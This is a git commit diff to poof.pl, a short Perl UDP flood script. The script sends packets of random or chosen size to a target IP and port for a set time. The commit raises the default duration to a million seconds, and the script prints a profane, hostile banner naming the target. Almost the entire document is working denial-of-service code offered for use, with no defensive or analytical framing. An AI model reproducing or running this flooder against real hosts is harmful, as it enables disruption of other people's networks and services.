a4c62daaabe42d9433cceb7fda9dda1ea7582df6
sX89q <77665775+sX89q@users.noreply.github.com>
2021-01-21 11:02:32 +0200

    Reduced reduntancy and optimized time
    Redundancy has been reduced and improved unlimited seconds when time are set to 0

--- poof.pl
+++ poof.pl
@@ -1,12 +1,10 @@
-
+#!/usr/bin/perl
 use Socket;
 
 my ($ip,$port,$size,$time) = @ARGV;
-
 my ($iaddr,$endtime,$psize,$pport);
-
-$iaddr = inet_aton("$ip") or die "Usage: perl poof.pl <Target> <Port> <Packet Size> <Time>\n";
-$endtime = time() + ($time ? $time : 100);
+$iaddr = inet_aton("$ip") or die "Usage: perl $0 <ip> <port> <packet size> <time>\n";
+$endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 print "FUCKING WEE POOF UP. FUCKING $ip on port $port with $size byte packets for $time seconds\n";
@@ -16,4 +14,4 @@ for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
 
-  send(flood, pack("a$psize","01010101"), 0, pack_sockaddr_in($pport, $iaddr));}
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
